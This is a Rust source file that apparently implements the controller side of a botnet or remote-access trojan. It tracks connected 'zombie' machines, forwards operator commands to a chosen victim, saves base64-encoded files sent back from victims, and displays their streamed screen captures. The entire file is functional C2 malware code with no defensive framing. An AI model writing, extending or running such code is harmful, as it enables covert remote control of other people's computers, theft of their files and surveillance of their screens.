use std::sync::{Arc, Mutex};

use super::super::super::utils::types::command_payload::CommandData;
use super::super::display_video_feed::display_video_feed;
use crate::{
    c2s::types::client_store::ClientStore,
    utils::base64::decode_base64_to_file::decode_base64_to_file,
};
use base64::{prelude::BASE64_STANDARD, Engine};
use serde_json::Value;
use socketioxide::extract::{Bin, Data, SocketRef};
use tracing::info;

pub fn on_connect(socket: SocketRef, Data(_): Data<Value>, clients: ClientStore) {
    let socket_id = socket.id.to_string();

    info!(
        "Client connected:\nNamespace: {:?}\nSocket ID: {:?}",
        socket.ns(),
        socket_id
    );

    clients
        .lock()
        .unwrap()
        .insert(socket_id.clone(), socket.clone());

    info!("Clients: {:#?}", clients);

    socket.emit("auth", socket.id).ok();

    let clients_clone = clients.clone();

    socket.on(
        "command-from-user",
        move |_: SocketRef, Data::<Value>(data), Bin(bin)| {
            info!("Received event: {:?} {:?}", data, bin);

            match serde_json::from_value::<CommandData>(data) {
                Ok(command_data) => {
                    let target_id = command_data.target_id;

                    if let Some(target_socket) = clients_clone.lock().unwrap().get(&target_id) {
                        target_socket
                            .bin(bin)
                            .emit("command-to-zombie", &command_data.command)
                            .ok();
                    }
                }

                Err(e) => {
                    info!("Error parsing command data: {:?}", e);
                }
            }
        },
    );

    let socket_id_clone = Arc::new(Mutex::new(socket_id.clone()));
    let socket_id_clone_for_zombie = Arc::clone(&socket_id_clone);
    socket.on(
        "command-response-from-zombie",
        move |_: SocketRef, Data::<Value>(data), Bin(_)| {
            info!("Received event from zombie: {:?}", data);

            match data {
                Value::String(output) => {
                    if output.starts_with("download") {
                        info!("Received base64 encoded file");
                        let outputs = output.split("--").collect::<Vec<&str>>();

                        let filename = outputs[1];
                        let base64_output = outputs[2];

                        let file_path = format!(
                            "zombie_{}_{}",
                            socket_id_clone_for_zombie.lock().unwrap(),
                            filename,
                        );

                        match decode_base64_to_file(&base64_output, &file_path) {
                            Ok(_) => {
                                info!("File saved to: {}", file_path);
                            }

                            Err(e) => {
                                info!("Error saving file: {:?}", e);
                            }
                        }
                    }

                    if output.starts_with("see-screen") {
                        info!("Received buffer");
                        let outputs = output.split("--").collect::<Vec<&str>>();
                        match BASE64_STANDARD.decode(outputs[1]) {
                            Ok(decoded) => {
                                info!("Decoded buffer size: {}", decoded.len());
                                match display_video_feed(decoded) {
                                    Ok(_) => {
                                        info!("Displaying video feed");
                                    }

                                    Err(e) => {
                                        info!("Error displaying video feed: {:?}", e);
                                    }
                                }
                            }

                            Err(e) => {
                                info!("Error decoding base64: {:?}", e);
                            }
                        }
                    }
                }
                _ => {}
            }
        },
    );

    let clients_clone = clients.clone();
    let socket_id_clone_for_disconnect = Arc::clone(&socket_id_clone);

    info!("{}", socket_id);

    socket.on_disconnect(move || {
        clients_clone
            .lock()
            .unwrap()
            .remove(&*socket_id_clone_for_disconnect.lock().unwrap());
        info!(
            "Client disconnected: {}",
            *socket_id_clone_for_disconnect.lock().unwrap()
        );
    });
}
